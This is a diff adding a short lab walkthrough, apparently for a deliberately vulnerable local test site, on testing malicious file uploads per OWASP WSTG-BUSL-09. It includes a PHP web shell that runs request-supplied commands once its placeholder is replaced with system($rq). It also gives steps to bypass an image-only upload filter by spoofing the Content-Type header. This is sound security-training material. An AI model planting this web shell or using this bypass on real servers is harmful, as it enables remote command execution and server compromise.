@@ -1,0 +1,42 @@
+Testing Upload of Malicious Files
+
+1) Find the page for WSTG-BUSL-09 (Test Upload of Malicious Files on OWASP WSTG 4.1(https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files.html)
+
+2) Create a PHP payload using code following instructions in the WebShell Backdoor section of the page:
+
+<?php
+if(isset($_REQUEST['rq'])){
+echo "<pre>";
+$rq= ($_REQUEST['rq']);
+/ *Replace CENSORED with system ($rq) to activate the sample* /
+CENSORED;
+echo "</pre>";
+die;
+}
+?>
+
+Don't forget to replace the word CENSORED with system ($rq) as noted in the instructions in the code.
+
+1) Try to upload the payload file on http://sbva.local/contact.php
+
+It will respond with an error message stating that only image files are allowed
+
+1) Follow the Evasion of FIlter instructions to bypass the website file upload checking rules and filters
+
+	1) Use Burp Suite to replace the Content-Type header value from application/x-php to image/jpeg, and forward the request.
+
+	2) Verify the file upload bypass by visiting http://sbva.local/upload/a.php (replace a.php with the name of the payload file you created)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
